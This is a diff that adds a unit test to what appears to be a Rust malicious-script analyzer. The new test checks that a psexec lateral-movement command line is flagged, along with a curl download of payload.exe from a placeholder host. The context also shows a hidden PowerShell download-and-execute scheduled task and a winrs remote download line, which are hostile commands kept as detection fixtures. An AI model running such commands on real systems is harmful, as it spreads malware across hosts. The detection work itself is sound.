@@ -2634,6 +2634,32 @@ schtasks /create /tn "Updater" /tr "powershell -w hidden \"IEX(New-Object Net.We
     }
 
     #[test]
+    fn psexec_slash_options_replay_remote_cmd_child() {
+        let script = br#"psexec \\target.example /u admin /p pass /s cmd.exe /V:ON /c set U=https://psexec-slash-wrapper.example/payload.exe&&curl -o payload.exe !U!"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://psexec-slash-wrapper.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "psexec slash-option remote child command was not analyzed: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::LateralMovement { tool, target_host }
+                    if tool == "psexec" && target_host == "target.example"
+            )),
+            "psexec slash-option lateral movement trait missing: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn winrs_replays_remote_cmd_child() {
         let script = br#"winrs -r:target.example cmd.exe /V:ON /c set U=https://winrs-wrapper.example/payload.exe&&curl -o payload.exe !U!"#;
         let report = analyze(script, &AnalyzeConfig::default());
